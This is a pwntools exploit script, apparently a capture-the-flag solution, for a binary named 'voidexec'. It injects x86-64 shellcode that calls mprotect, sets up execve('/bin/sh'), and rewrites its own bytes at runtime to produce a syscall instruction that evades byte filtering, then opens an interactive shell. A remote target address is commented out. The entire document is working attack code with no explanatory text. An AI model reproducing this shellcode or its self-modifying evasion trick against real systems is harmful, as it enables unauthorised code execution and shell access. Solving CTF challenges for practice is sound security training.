from pwn import *

binary = './voidexec'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = process(binary)
# r = remote('10.10.150.155', 9008)

shellcode = asm(f'''
    lea rbx, [r13 - {e.sym['main']} + {e.plt['mprotect']}]

    mov rdi, 0xC0DE0000
    mov rsi, 0x64
    mov rdx, 0x7
    call rbx

    mov rax, 0x3b
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    inc byte ptr [rip + syscall]
    inc byte ptr [rip + syscall + 1]
    
syscall:
    .byte 0x0e, 0x04
''')
log.info(f'Length of shellcode: {len(shellcode)}')

r.recvuntil(b'Send to void execution: ')
r.sendline(shellcode)
r.interactive()
